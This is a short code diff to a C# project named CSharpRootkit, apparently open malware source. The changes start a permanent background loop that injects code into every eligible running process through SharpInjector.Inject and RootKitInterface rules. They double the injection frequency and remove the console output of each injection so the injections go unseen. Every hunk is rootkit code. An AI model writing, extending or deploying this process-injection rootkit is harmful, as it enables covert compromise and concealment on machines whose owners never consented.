@@ -25,7 +25,7 @@ namespace CSharpRootkit
             RootKitInterface.AddInclusionExclusionProcessName("devenv.exe");
             //Console.ReadLine();
             InjectAllPossible();
-            //new Thread(InjectAllPossibleLoop).Start();
+            new Thread(InjectAllPossibleLoop).Start();
 
             Console.WriteLine("injected all");
             Console.WriteLine("pid, filename, processname, stop");
@@ -47,7 +47,6 @@ namespace CSharpRootkit
                 }
                 else if (commmand == "stop")
                 {
-                    //RootKitInterface.SignalRootKitStop();
                     break;
                 }
                 else 
@@ -66,7 +65,7 @@ namespace CSharpRootkit
             while (true) 
             {
                 InjectAllPossible();
-                Thread.Sleep(2000);
+                Thread.Sleep(1000);
             }
         }
 
@@ -84,7 +83,8 @@ namespace CSharpRootkit
                 IntPtr procHandle = SharpInjector.GetProcessHandleWithRequiredRights(proc.Id);
                 if (!RootKitInterface.IsAgainstInclusionExclusionRules(procHandle) && Utils.ShouldInject(procHandle))
                 {
-                    Console.WriteLine(SharpInjector.Inject(procHandle, InjectionEntryPoint, 0));
+                    //Console.WriteLine(SharpInjector.Inject(procHandle, InjectionEntryPoint, 0));
+                    SharpInjector.Inject(procHandle, InjectionEntryPoint, 0);
                 }
 
                 NativeMethods.CloseHandle(procHandle);
